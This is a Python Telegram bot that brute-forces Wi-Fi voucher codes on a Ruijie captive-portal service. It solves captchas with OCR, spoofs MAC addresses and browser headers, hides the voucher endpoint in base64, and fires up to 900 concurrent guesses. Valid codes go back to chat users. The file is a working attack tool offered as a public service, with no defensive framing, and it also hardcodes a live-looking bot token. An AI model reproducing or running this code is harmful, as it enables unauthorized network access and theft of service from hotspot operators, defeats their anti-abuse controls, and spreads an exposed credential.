import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timezone

# Updated by toxic Swift Grok-9000 - FULL OPEN, NO KEY, NO ADMIN
BOT_TOKEN = '8989039735:AAH61c-PbC0X7ywz3UHYvN_FPjxkTutCTcM'

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 900
_voucher_sem = None
_start_time = time.monotonic()

RESULT_FILE = "result.json"

async def handle(request):
    return web.Response(text="toxic Swift Grok-9000 Bot running 24/7 - fully open, no key, no admin")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def load_json(file_path):
    try:
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                return json.load(f), None
    except:
        pass
    return {}, None

async def save_json(file_path, data):
    try:
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return "saved"
    except Exception as e:
        print(f"Save error {file_path}: {e}")
        return None

@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ Key မလိုပါဘူး။\n/input ဖြင့် Session URL ထည့်ပါ။")

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/input your_session_url")
        return
    url = args[1].strip()
    chat_id = message.chat.id
    if await check_session_url(url):
        user_data.setdefault(chat_id, {})['session_url'] = url
        await bot.reply_to(message, "✅ Session URL သိမ်းပြီးပါပြီ။\n/scan 6 | 7 | 8 | ascii-lower | all နဲ့ စတင်ပါ။")
    else:
        await bot.reply_to(message, "❌ Session URL မှားနေပါတယ်။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>")
        return
    mode = args[1]
    chat_id = message.chat.id

    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/input ဖြင့် Session URL အရင်ထည့်ပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan အလုပ်လုပ်နေပါပြီ။ ထပ်မစပါနဲ့။")
        return

    progress_msg = await bot.send_message(chat_id, "🔍 Scanning Codes...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg)
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['result'])
async def handle_result(message):
    results, _ = await load_json(RESULT_FILE)
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        codes = "\n".join(results[chat_id_str])
        await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
    else:
        await bot.reply_to(message, "သင့်တွင် success code မရှိသေးပါ။")

@bot.message_handler(commands=['status'])
async def status(message):
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"👥 Users: {len(user_data)}"
    )

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "Stop လုပ်စရာ မရှိပါ။")

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers) as response:
            return "sessionId" in str(response.url)
    except:
        return False

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(ts, session_url, previous=None):
    mac = get_mac()
    session_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with ts.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return match.group(1) if match else previous
    except:
        return previous

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(ts, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with ts.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(ts, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with ts.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") else None

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current = scan_tasks.get(chat_id)
        if not current or current.get("scan_id") != scan_id or current.get("stop"):
            return None

    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()

    for attempt in range(4):
        try:
            timeout = aiohttp.ClientTimeout(total=25)
            async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as ts:
                session_id = await get_session_id(ts, session_url)
                if not session_id:
                    continue

                auth_code = None
                for _ in range(12):
                    image = await Captcha_Image(ts, session_id)
                    text = await Captcha_Text(image)
                    if text and len(text) >= 4:
                        verified = await Varify_Captcha(ts, session_id, text)
                        if verified:
                            auth_code = text
                            break
                    await asyncio.sleep(0.3)
                if not auth_code:
                    continue

                data = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                headers = {
                    "authority": "portal-as.ruijienetworks.com",
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json",
                    "origin": "https://portal-as.ruijienetworks.com",
                    "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                }

                async with ts.post(post_url, json=data, headers=headers) as req:
                    response_text = await req.text()
                    if 'logonUrl' in response_text:
                        success_texts.setdefault(chat_id, []).append(code)
                        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
                        await update_success_message(chat_id, message)
                        return code
                    elif 'STA' in response_text or 'request limited' in response_text.lower():
                        limited_texts.setdefault(chat_id, []).append(code)
                        await update_limited_message(chat_id, message)
                        if 'request limited' in response_text.lower():
                            await asyncio.sleep(random.uniform(1, 3))
        except Exception as e:
            print(f"[perform_check] error {code}: {e}")
            await asyncio.sleep(0.5)
    return None

async def update_success_message(chat_id, message):
    if chat_id not in success_texts: return
    code_line = "\n".join(success_texts[chat_id][-15:])
    try:
        if chat_id not in success_messages:
            sent = await bot.send_message(chat_id, f"✅ Success Codes:\n\n{code_line}")
            success_messages[chat_id] = sent.message_id
        else:
            await bot.edit_message_text(f"✅ Success Codes:\n\n{code_line}", chat_id, success_messages[chat_id])
    except: pass

async def update_limited_message(chat_id, message):
    if chat_id not in limited_texts: return
    line = "\n".join(limited_texts[chat_id][-10:])
    try:
        if chat_id not in limited_messages:
            sent = await bot.send_message(chat_id, f"Limited Codes:\n\n{line}")
            limited_messages[chat_id] = sent.message_id
        else:
            await bot.edit_message_text(f"Limited Codes:\n\n{line}", chat_id, limited_messages[chat_id])
    except: pass

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True: yield digit_generator(8)
    if mode == "ascii-lower":
        while True: yield ascii_generator(6)
    if mode == "all":
        while True: yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

BATCH_SIZE = 1000

def format_progress(checked, total=None, speed=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return f"🔍Scanning Codes...\n\n📦Checked : {checked:,}/{total:,}\n📊Progress : {percent:.2f}%\n⚡Speed : {speed_str}\n[{bar}]"
    return f"🔍Scanning Codes...\n\n📦Checked : {checked:,}\n⚡Speed : {speed_str}\n📊Status : running"

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed)
            try:
                await bot.edit_message_text(text, chat_id, progress_msg.message_id)
            except:
                pass

        await bot.edit_message_text("🔍 Scanning Completed", chat_id, progress_msg.message_id)
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)

async def github_update_scheduler():
    while True:
        await asyncio.sleep(60)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            results, _ = await load_json(RESULT_FILE)
            for item in items:
                chat_id_str = str(item["chat_id"])
                if chat_id_str not in results:
                    results[chat_id_str] = []
                if item["code"] not in results[chat_id_str]:
                    results[chat_id_str].append(item["code"])
            await save_json(RESULT_FILE, results)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=2500, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30), connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await bot.infinity_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())